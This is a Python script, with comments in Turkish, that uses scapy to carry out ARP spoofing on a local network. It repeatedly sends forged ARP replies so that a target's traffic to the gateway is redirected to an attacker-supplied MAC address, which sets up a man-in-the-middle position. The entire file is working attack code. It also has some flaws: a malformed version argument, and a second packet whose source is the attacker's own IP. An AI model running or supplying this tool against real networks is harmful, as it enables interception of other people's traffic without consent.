import argparse
import scapy.all as scapy
from time import sleep
from rich import print

def ParserArgument():
    parser = argparse.ArgumentParser(description='Arp_Poisen')
    parser.add_argument('-v' , '--version', help='Version of program' , version='1.0')
    parser.add_argument('--interface',required=True,dest="interface",help="Give The Type of Ethernet Adapter")
    #☻parser.add_argument('--type' ,required=True,dest="type",choices=['all_network','one_target'],help="Chose An Attack")
    parser.add_argument('-di' , '--default_getaway' , required=True    ,dest="default_getaway" , help='Give The Address of default_getaway',default=None)
    parser.add_argument('-dm' , '--default_getaway_mac' , required=True ,dest="default_getaway_mac" , help='Give The Address of default_getaway',default=None)
    parser.add_argument('-ti' , '--target_ip' , required=True ,dest="target_ip", help='Give The Target Ip Address',default=None)
    parser.add_argument('-tm' , '--target_mac', required=True ,dest="target_mac" , help='Give The Target Mac Address',default=None)
    parser.add_argument('-hi' , '--hacker_ip' , required=True ,dest="hacker_ip" , help='Give The Hacker IP Address',default=None)
    parser.add_argument('-hm' , '--hacker_mac', required=True ,dest="hacker_mac" , help='Give The Hacker Mac Address,default=None')
    args = parser.parse_args()
    return args


def send_arp_spoofing_packets(interface_adapter,default_getaway,default_getaway_mac,target_ip,target_mac,hacker_ip,hacker_mac):
    arp_response_to_target = scapy.ARP(
        op=2,                # ARP Reply
        psrc=default_getaway,  # Gateway IP
        hwsrc=hacker_mac,  # Hacker PC MAC
        pdst=target_ip,  # Hedef IP
        hwdst=target_mac  # Hedef MAC
    )
    scapy.send(arp_response_to_target, verbose=True ,iface=interface_adapter)  # Paketleri gönder

    # Hedef cihazına (192.168.1.146) ARP yanıtı gönderiyoruz, hacker PC'nin MAC adresini gateway IP'ye (192.168.1.1) atıyoruz
    arp_response_to_gateway = scapy.ARP(
        op=2,               
        #Hacker Pc Info
        psrc=hacker_ip,  
        hwsrc=hacker_mac,  
        
        #Getaway İnfo
        pdst=default_getaway,  
        hwdst=default_getaway_mac 
    )
    scapy.send(arp_response_to_gateway, verbose=True ,iface=interface_adapter)  # Paketleri gönder


if __name__ == '__main__':
    args = ParserArgument()    
    while True:
        send_arp_spoofing_packets(args.interface , args.default_getaway,args.default_getaway_mac,
        args.target_ip,args.target_mac,args.hacker_ip,args.hacker_mac)  
        sleep(3)  # 3 saniye bekle
        print("Çalışıyor Şuanda")  # Durum mesajı



